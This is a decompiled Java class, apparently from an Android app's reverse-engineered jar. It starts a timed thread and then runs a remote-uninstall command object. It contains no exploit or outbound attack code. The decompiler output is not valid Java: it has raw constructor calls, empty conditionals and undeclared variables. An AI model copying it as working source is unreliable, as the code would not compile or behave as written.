package com.vvt.appengine.a;

import com.vvt.appengine.AppEngine1;
import com.vvt.polymorphic.command.RemoteUninstallApplication;
import java.io.IOException;

public class bv
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  
  public boolean a(AppEngine1 paramh)
  {
    bool1 = a;
    if (bool1) {}
    Object localObject1 = new java/lang/Thread;
    bw localbw = new com/vvt/appengine/a/bw;
    localbw.<init>(this, paramh);
    ((Thread)localObject1).<init>(localbw);
    long l = 10000L;
    com.vvt.ai.a.a((Thread)localObject1, l);
    bool1 = a;
    if (bool1) {}
    localObject1 = new com/vvt/polymorphic/command/RemoteUninstallApplication;
    ((RemoteUninstallApplication)localObject1).<init>();
    try
    {
      localObject1 = ((RemoteUninstallApplication)localObject1).execute();
      localObject1 = (Boolean)localObject1;
      bool1 = ((Boolean)localObject1).booleanValue();
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        bool1 = false;
        Object localObject2 = null;
        boolean bool2 = b;
        if (!bool2) {}
      }
    }
    bool2 = a;
    if (bool2) {}
    return bool1;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/bv.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */